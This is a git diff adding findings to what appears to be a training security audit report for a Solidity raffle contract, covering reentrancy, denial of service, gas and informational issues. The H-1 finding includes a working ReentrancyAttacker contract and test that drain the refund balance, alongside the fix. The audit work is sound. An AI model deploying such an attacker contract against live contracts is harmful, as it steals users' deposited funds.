@@ -1,9 +1,136 @@
+### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance
+
+**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.
+
+In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.
+
+```javascript
+function refund(uint256 playerIndex) public {
+    address playerAddress = players[playerIndex];
+    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+@>  payable(msg.sender).sendValue(entranceFee);
+@>  players[playerIndex] = address(0);
+
+    emit RaffleRefunded(playerAddress);
+}
+```
+
+A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.
+
+**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.
+
+**Proof of Concept:**
+
+1. User enters the raffle
+2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
+3. Attacker enters the raffle
+4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.
+
+<details>
+<summary>code</summary>
+
+Place the following into `PuppyRaffleTest.t.sol`
+
+```javascript
+function test_ReentrancyRefund() public {
+    address[] memory players = new address[](4);
+    players[0] = playerOne;
+    players[1] = playerTwo;
+    players[2] = playerThree;
+    players[3] = playerFour;
+    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
+    address attackUser = makeAddr("attackUser");
+    vm.deal(attackUser, 1 ether);
+
+    uint256 startingAttack = address(attackerContract).balance;
+    uint256 startingContractBalance = address(puppyRaffle).balance;
+
+    vm.prank(attackUser);
+    attackerContract.attack{value: entranceFee}();
+
+    console.log("starting attacker contract balance: ", startingAttack);
+    console.log("starting contract balance: ", startingContractBalance);
+
+    console.log("ending attacker contract balance: ", address(attackerContract).balance);
+    console.log("ending contract balance: ", address(puppyRaffle).balance);
+}
+```
+
+</details>
+
+And this contract as well :
+
+<details>
+<summary>code</summary>
+
+```javascript
+contract ReentrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    receive() external payable {
+        _stealMoney();
+    }
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+}
+```
+
+</details>
+
+**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should have the event emission up as well.
+
+```diff
+function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
++       players[playerIndex] = address(0);
++       emit RaffleRefunded(playerAddress);
+        payable(msg.sender).sendValue(entranceFee);
+-       players[playerIndex] = address(0);
+-       emit RaffleRefunded(playerAddress);
+}
+```
+
+## Likelihood & Impact:
+
+- Impact: HIGH
+- Likelihood: HIGH
+- Severity: HIGH
+
 ### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of services (DoS) attack, incrementing gas costs for future entrants
 
 **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle stats will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.
 
 ```javascript
-// @audit DoS Attack
 @>  for (uint256 i = 0; i < players.length - 1; i++) {
         for (uint256 j = i + 1; j < players.length; j++) {
             require(players[i] != players[j], "PuppyRaffle: Duplicate player");
@@ -106,3 +233,157 @@ Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://do
 - Impact: MEDIUM
 - Likelihood: MEDIUM
 - Severity: MEDIUM
+
+# Gas
+
+### [G-1] Unchanged state variables should be declared constant or immutable
+
+**Description:** Reading from storage is much more expensive than reading from a constant or immutable variable.
+
+**Impact:** Used more gas.
+
+**Proof of Concept:**
+
+<details><summary>1 Found Instances</summary>
+
+```solidity
+uint256 public raffleDuration;
+.
+.
+string private commonImageUri
+.
+.
+string private rareImageUri
+.
+.
+string private legendaryImageUri
+```
+
+</details>
+
+**Recommended Mitigation:**
+
+- `PuppyRaffle::raffleDuration` should be `immutable` to keep the gas efficient.
+- `PuppyRaffle::commonImageUri` should be `constant` to keep the gas efficient.
+- `PuppyRaffle::rareImageUri` should be `constant` to keep the gas efficient.
+- `PuppyRaffle::legendaryImageUri` should be `constant` to keep the gas efficient.
+
+### [G-2] Storage variables in a loop should be cached
+
+**Description:** Everytime you call `players.length` you read from storage.
+
+**Impact:** reading from storage will increase the gas fees.
+
+**Proof of Concept:**
+
+```javascript
+    for (uint256 i = 0; i < players.length - 1; i++) {
+        for (uint256 j = i + 1; j < players.length; j++) {
+            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+        }
+    }
+```
+
+**Recommended Mitigation:** Use a local memory variable, which is more gas efficient.
+
+```diff
++   uint256 playersLength = player.length;
+-   for (uint256 i = 0; i < players.length - 1; i++) {
++   for (uint256 i = 0; i < playersLength - 1; i++) {
+-       for (uint256 j = i + 1; j < players.length; j++) {
++       for (uint256 j = i + 1; j < playersLength; j++) {
+            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+        }
+    }
+```
+
+### [I-1] Solidity pragma should be specific, not wide
+
+**Description:** Using a wide version ranges such as `^0.x.y` allow compilation with newer versions of Solidity in minor versions, which may introduce unwanted behavioural changes.
+
+**Impact:**
+
+- Using a wide version range for Solidity pragmas may cause incompatibilities or compatibility issues in the future.
+- Difficulties in debugging and maintenance due to differences in behaviour between versions.
+
+**Proof of Concept:**
+
+<details><summary>1 Found Instances</summary>
+
+```solidity
+pragma solidity ^0.7.6;
+```
+
+</details>
+
+**Recommended Mitigation:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`.
+
+## Likelihood & Impact:
+
+- Impact: NONE
+- Likelihood: HIGH
+- Severity: Informational
+
+### [I-2] Using an outdated versions of solidity is not recommended, potential security vulnerabilities
+
+**Description:** `solc` frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex `pragma` statement.
+
+**Impact:** Potential security vulnerabilities.
+
+**Proof of Concept:**
+
+```solidity
+pragma solidity ^0.7.6;
+```
+
+**Recommended Mitigation:** Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
+`0.8.29`.
+
+```diff
+- pragma solidity ^0.7.6;
++ pragma solidity 0.8.29;
+```
+
+Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.
+
+## Likelihood & Impact:
+
+- Impact: NONE
+- Likelihood: HIGH
+- Severity: Informational
+
+### [I-3] Missing checks for `address(0)` when assigning values to address state variables
+
+**Impact:** The functions will fail to execute.
+
+**Proof of Concept:**
+
+<details><summary>2 Found Instances</summary>
+
+```solidity
+    feeAddress = _feeAddress;
+```
+
+```solidity
+    feeAddress = newFeeAddress;
+```
+
+</details>
+
+**Recommended Mitigation:** Check for `address(0)` when assigning values to address state variables, revert when the state is zero.
+
+```diff
++ require(_feeAddress != address(0), "Fee address cannot be zero");
+feeAddress = _feeAddress;
+.
+.
+.
++ require(newFeeAddress != address(0), "New fee address cannot be zero");
+feeAddress = newFeeAddress;
+```
+
+## Likelihood & Impact:
+
+- Impact: NONE
+- Likelihood: HIGH
+- Severity: Informational
